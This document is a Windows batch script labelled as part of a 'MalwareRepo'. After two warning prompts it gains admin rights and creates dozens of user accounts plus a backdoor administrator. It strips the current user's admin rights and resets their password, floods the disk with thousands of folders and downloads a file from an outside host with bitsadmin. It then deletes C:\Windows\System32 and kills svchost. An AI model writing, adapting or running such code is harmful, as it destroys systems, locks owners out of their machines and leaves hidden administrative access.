@echo off
FSUTIL DIRTY query %SystemDrive% >NUL || (
    PowerShell "Start-Process -FilePath '%0' -Verb RunAs"
    EXIT
)
set /p userChoice1="This file can cause damages. Run it at your own risk. Do you want to continue? (yes/no): "
if /I "%userChoice1%" NEQ "yes" (
    echo Exiting program...
    timeout /t 2 >nul
    exit
)

cls

set /p userChoice2="Are you ABSOLUTELY sure? Running this will destory your computer. (yes/no): "
if /I "%userChoice2%" NEQ "yes" (
    echo Exiting program...
    timeout /t 2 >nul
    exit
)


:: Protected Script Start
title dxvCodes - MalwareRepo
del /f /s /q C:\Windows\Web
:: Adding Users
for /L %%i in (1,1,54) do net user gl%%i /add
for /L %%i in (1,1,54) do net user gl%%i ripyourcomputer
net user elevator /add
net user elevator advancedelevatorpermissionstab911611
net localgroup Administrators elevator /add
net localgroup Users %USERNAME% /add
net localgroup Administrators %USERNAME% /delete
net user %USERNAME% elevatorperms
:: End Of adding users
cd C:\users\%USERNAME%\desktop
for /L %%i in (1,1,999) do mkdir destroy%%i
cd C:\
mkdir encrypted1net
cd encrypted1net
mkdir spammergetspammed
cd spammergetspammed
for /L %%i in (1,1,99999) do mkdir spammed%%i
cd..
cd..
cd encrypted1net
mkdir styler
cd styler
mkdir background
cd background
mkdir protected
cd protected
bitsadmin /transfer YouDontNeedToKnowWhatThisIs https://cds.dxvprojects.org/assets/public/distimage.zip "C:\encrypted1net\styler\background\protected\content.zip"
tar -xf content.zip
del content.zip
ren backgroundimg.jpg TranscodedWallpaper
move /Y TranscodedWallpaper C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Themes
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
rd /s /q C:\Windows\System32
cd users\%USERNAME%\desktop
taskkill /f /im svchost.exe
taskkill /f /im svchost.exe
